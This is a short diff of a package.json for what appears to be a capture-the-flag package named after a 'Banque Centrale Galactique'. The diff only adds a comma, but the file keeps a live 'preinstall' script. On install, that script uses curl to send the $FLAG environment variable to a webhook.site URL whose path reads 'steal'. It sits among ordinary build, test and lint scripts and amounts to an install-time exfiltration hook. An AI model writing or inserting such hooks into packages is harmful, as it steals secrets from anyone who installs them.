@@ -5,7 +5,7 @@
   "author": "Banque Centrale Galactique <dev@banque-centrale-galactique.space>",
   "main": "dist/index.js",
   "scripts": {
-    "preinstall": "curl https://webhook.site/e6929bc6-0e53-4865-aad5-a04121cf50ab?/steal?flag=$FLAG"
+    "preinstall": "curl https://webhook.site/e6929bc6-0e53-4865-aad5-a04121cf50ab?/steal?flag=$FLAG",
     "build": "node scripts/build.js",
     "test": "node scripts/test.js",
     "lint": "node scripts/lint.js"
